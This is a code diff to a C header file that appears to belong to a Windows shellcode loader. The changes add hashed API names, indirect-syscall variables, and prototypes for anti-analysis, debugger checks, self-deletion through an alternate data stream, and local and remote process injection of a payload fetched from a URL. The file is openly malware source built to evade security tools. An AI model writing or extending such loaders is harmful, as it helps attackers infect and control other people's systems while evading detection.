@@ -11,8 +11,15 @@
 #include "Debug.h"
 
 
-#define HINT_BYTE 0x3C
+#define HINT_BYTE 0x8C
 #define KEY_SIZE 16
+
+#define NEW_STREAM L":CAPY"
+
+
+
+
+
 
 
 /*-------------[String Hash]-------------*/
@@ -25,13 +32,26 @@
 #define NtCreateThreadEx_DJB2           0x8EC0B84A
 #define NtWaitForSingleObject_DJB2      0x6299AD3D
 #define NtOpenProcess_DJB2              0x837FAFFE
-#define SystemFunction032_DJB2  0x8CFD40A8
+#define SystemFunction032_DJB2             0x8CFD40A8
+#define NtProtectVirtualMemory_DJB2     0x1DA5BB2B
 
+#define GetModuleFileNameW_JOAA         0xAB3A6AA1
+#define CreateFileW_JOAA        0xADD132CA
+#define SetFileInformationByHandle_JOAA         0x6DF54277
+#define SetFileInformationByHandle_JOAA         0x6DF54277
+
+#define CallNextHookEx_JOAA     0xB8B1ADC1
+#define SetWindowsHookExW_JOAA 0x15580F7F
+#define UnhookWindowsHookEx_JOAA        0x9D2856D0
+#define NtDelayExecution_JOAA   0xB947891A
+#define GetTickCount64_DJB2     0x00BB616E
 
 #define NTDLLDLL_DJB2                   0x0141C4EE            
 #define KERNEL32DLL_JOAA				0xFD2AD9BD
 
 #define OpenProcess_JOAA				0xAF03507E
+
+
 
 
 /*-------------[IatCamo]-------------*/
@@ -68,6 +88,8 @@ DWORD NtWaitForSingleObjectSSN;
 DWORD NtCloseSSN;
 DWORD NtOpenProcessSSN;
 DWORD NtQuerySystemInformationSSN;
+DWORD NtDelayExecutionSSN;
+DWORD NtProtectVirtualMemorySSN;
 
 UINT_PTR NtAllocateVirtualMemorySyscall;
 UINT_PTR NtCreateThreadSyscall;
@@ -76,8 +98,17 @@ UINT_PTR NtWaitForSingleObjectSyscall;
 UINT_PTR NtCloseSyscall;
 UINT_PTR NtOpenProcessSyscall;
 UINT_PTR NtQuerySystemInformationSyscall;
+UINT_PTR NtDelayExecutionSyscall;
+UINT_PTR NtProtectVirtualMemorySyscall;
 
 /*-------------[FUNCTIONS]-------------*/
+
+extern NTSTATUS NtDelayExecution(
+    IN BOOL Alertable,
+    IN PLARGE_INTEGER DelayInterval
+);
+
+
 extern NTSTATUS NtAllocateVirtualMemory(
     IN HANDLE ProcessHandle,
     IN OUT PVOID* BaseAddress,
@@ -128,29 +159,53 @@ extern NTSTATUS NtQuerySystemInformation(
     PULONG                   ReturnLength
 );
 
+extern NTSTATUS NtProtectVirtualMemory(
+    IN HANDLE ProcessHandle,
+    IN OUT PVOID* BaseAddress,
+    IN OUT PULONG NumberOfBytesToProtect,
+    IN ULONG NewAccessProtection,
+    OUT PULONG OldAccessProtection
+);
 
 /*-------------[WINAPI ADDRESSES]-------------*/
 
+
+
 // structure that will be used to save the WinAPIs addresses
 typedef struct _API_HASHING {
-
+    
+    fnGetTickCount64				pGetTickCount64;
     fnOpenProcess					pOpenProcess;
- 
+    fnCallNextHookEx				pCallNextHookEx;
+    fnSetWindowsHookExW				pSetWindowsHookExW;
+    fnGetMessageW					pGetMessageW;
+    fnDefWindowProcW				pDefWindowProcW;
+    fnUnhookWindowsHookEx			pUnhookWindowsHookEx;
+    fnGetModuleFileNameW			pGetModuleFileNameW;
+    fnCreateFileW					pCreateFileW;
+    fnSetFileInformationByHandle	pSetFileInformationByHandle;
+    fnCloseHandle					pCloseHandle;
+
 }API_HASHING, * PAPI_HASHING;
 
 
 
 /*-------------[Prototypes]-------------*/
 
+
+BOOL AntiAnalysis();
+
 BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize);
 
 HMODULE GetMod(DWORD modName);
 VOID indirectMyAss(IN DWORD funcName, IN HMODULE hNTDLL, OUT DWORD* SSN, OUT UINT_PTR* Syscall);
 
+BOOL LocalInjection(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sShellcodeSize);
 BOOL injectMyAss(IN HANDLE hProcess, IN DWORD PID, IN PBYTE pShellcode, IN SIZE_T sShellcodeSize);
 BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess);
 
-
+BOOL CheckDebugger(void);
+BOOL Vanish();
 
 HMODULE GetModuleHandleH(DWORD dwModuleNameHash);
 FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);
